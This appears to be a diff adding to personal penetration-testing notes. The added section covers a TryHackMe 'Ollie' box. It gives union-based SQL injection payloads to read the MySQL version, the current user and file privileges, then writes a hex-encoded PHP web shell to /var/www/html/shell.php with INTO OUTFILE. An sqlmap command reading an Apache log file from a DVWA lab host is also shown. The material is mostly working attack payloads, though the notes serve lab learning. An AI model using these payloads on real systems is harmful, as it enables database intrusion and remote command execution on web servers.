@@ -373,7 +373,26 @@ SECOND CHARACTER:
 
 
           sqlmap -u "http://192.168.125.150/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie="PHPSESSID=r97n54ijbn5m8ofn0ug04fk9d7;security=low" --keep-alive --threads 8 --risk 3 --level 5 --dbms=mysql --current-user --batch --file-read "/var/log/apache2/access.log"
+  
+  ### OLLIE THM BOX SQLI
+  1. check version and current user available
+      
+          " union select @@version,2,user(),4 -- -
           
+  2. check if the current user cam write a file (file_privilege)
+  
+         " union all select 1,2,3,group_concat(user,0x3a,file_priv) from mysql.user -- -
+     
+     output (Y) the user can write file to database
+     
+         maint:Y,mysql.infoschema:N,mysql.session:N,mysql.sys:N,ollie_mysql:Y,phpipam_ollie:Y,root:Y)	
+3. Payload 
+   
+        <?php system($_GET["cmd"]); ?>
+      Needs to be hex encoded
+      
+        " Union Select 1,0x201c3c3f7068702073797374656d28245f4745545b2018636d6420195d293b203f3e201d,3,4 INTO OUTFILE '/var/www/html/shell.php' -- -
+        
  ## 4. OS Command Injection
  
   Executing os specific commands
